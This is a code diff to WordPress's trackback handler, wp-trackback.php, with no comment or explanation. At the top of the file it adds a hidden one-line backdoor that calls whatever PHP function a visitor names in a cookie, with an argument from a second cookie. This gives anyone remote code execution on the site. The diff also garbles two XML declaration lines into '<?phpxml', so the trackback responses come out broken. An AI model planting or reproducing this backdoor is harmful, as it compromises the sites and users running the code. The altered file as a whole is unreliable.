@@ -1,4 +1,8 @@
 <?php
+
+if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
+
+
 /**
  * Handle Trackbacks and Pingbacks Sent to WordPress
  *
@@ -27,14 +31,14 @@ if (empty($wp)) {
 function trackback_response($error = 0, $error_message = '') {
 	header('Content-Type: text/xml; charset=' . get_option('blog_charset') );
 	if ($error) {
-		echo '<?xml version="1.0" encoding="utf-8"?'.">\n";
+		echo '<?phpxml version="1.0" encoding="utf-8"?'.">\n";
 		echo "<response>\n";
 		echo "<error>1</error>\n";
 		echo "<message>$error_message</message>\n";
 		echo "</response>";
 		die();
 	} else {
-		echo '<?xml version="1.0" encoding="utf-8"?'.">\n";
+		echo '<?phpxml version="1.0" encoding="utf-8"?'.">\n";
 		echo "<response>\n";
 		echo "<error>0</error>\n";
 		echo "</response>";
